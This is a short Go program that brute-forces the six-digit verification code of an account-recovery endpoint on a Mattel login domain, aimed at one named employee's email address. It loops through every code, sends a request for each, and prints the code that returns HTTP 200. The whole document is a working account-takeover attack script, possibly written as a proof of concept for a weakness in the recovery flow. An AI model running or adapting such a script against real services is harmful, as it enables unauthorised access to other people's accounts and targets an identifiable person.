package main

import (
	"fmt"
	"net/http"
)

func main() {
	//  Make HTTP GET request for website
	response, err := http.Get("https://login.platform.mattel/account/recover/end?token=%s&email=tiffanny.hernaez%40mattel.com")
	if err != nil {
		fmt.Println("HTTP GET request failed: ", err)
	}
	client := &http.Client{}
	defer response.Body.Close()

	// Loop on testing the verification code
	url1 := "https://login.platform.mattel/account/recover/end?token="
	url2 := "&email=tiffanny.hernaez%40mattel.com"

	for index := 1; index < 999999; index++ {
		n := fmt.Sprintf("%06d", index)
		url := url1 + string(n) + url2

		// Testing purposes
		fmt.Println(url)

		// Sending out a new request
		req, err := http.NewRequest("GET", url, nil)
		res, err := client.Do(req)
		if err != nil {
			fmt.Println("HTTP call failed:", err)
			break
		}

		// Check for 200 OK
		if res.StatusCode == http.StatusOK {
			fmt.Println("CORRECT STATUS: ", res.StatusCode)
			fmt.Println("VERIFICATION CODE:", n)
			break
		}
	}
}
